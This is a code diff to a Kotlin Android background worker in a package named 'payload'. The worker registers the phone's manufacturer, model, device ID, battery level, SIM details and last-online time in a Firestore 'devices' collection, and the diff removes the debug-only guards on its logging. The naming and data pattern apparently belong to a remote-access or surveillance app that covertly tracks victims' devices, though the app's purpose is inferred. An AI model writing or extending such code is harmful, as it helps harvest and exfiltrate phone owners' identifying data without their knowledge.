@@ -7,6 +7,8 @@ import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.google.firebase.firestore.FirebaseFirestore
 import com.payload.jansiix0ne.models.DeviceModel
+import com.payload.jansiix0ne.models.SimModel
+import com.payload.jansiix0ne.utils.DeviceUtils
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
@@ -21,41 +23,37 @@ class RegisterUserWorker(
 
     override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
         try {
-            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
-                android.util.Log.d("RegisterUserWorker", "Starting device registration...")
-            }
+            android.util.Log.d("RegisterUserWorker", "Starting device registration...")
             
             val deviceId = getDeviceId()
             val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val batteryLevel = DeviceUtils.getBatteryLevel(applicationContext)
+            val simInfo = DeviceUtils.getSimInfo(applicationContext)
             
-            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
-                android.util.Log.d("RegisterUserWorker", "Device ID: $deviceId")
-                android.util.Log.d("RegisterUserWorker", "Device Name: $deviceName")
-            }
+            android.util.Log.d("RegisterUserWorker", "Device ID: $deviceId")
+            android.util.Log.d("RegisterUserWorker", "Device Name: $deviceName")
+            android.util.Log.d("RegisterUserWorker", "Battery: $batteryLevel%")
+            android.util.Log.d("RegisterUserWorker", "SIM Info collected")
             
             val deviceModel = DeviceModel(
                 mobilename = deviceName,
                 deviceid = deviceId,
-                charge = "100%"
+                charge = "$batteryLevel%",
+                simModel = simInfo,
+                lastOnline = System.currentTimeMillis()
             )
             
             // Register device in Firestore
-            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
-                android.util.Log.d("RegisterUserWorker", "Uploading to Firestore...")
-            }
+            android.util.Log.d("RegisterUserWorker", "Uploading to Firestore...")
             firestore.collection("devices")
                 .document(deviceId)
-                .set(deviceModel)
+                .set(deviceModel, com.google.firebase.firestore.SetOptions.merge())
                 .await()
             
-            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
-                android.util.Log.d("RegisterUserWorker", "✅ Device registered successfully!")
-            }
+            android.util.Log.d("RegisterUserWorker", "✅ Device registered successfully!")
             Result.success()
         } catch (e: Exception) {
-            if (com.payload.jansiix0ne.BuildConfig.DEBUG) {
-                android.util.Log.e("RegisterUserWorker", "❌ Registration failed: ${e.message}", e)
-            }
+            android.util.Log.e("RegisterUserWorker", "❌ Registration failed: ${e.message}", e)
             Result.failure()
         }
     }
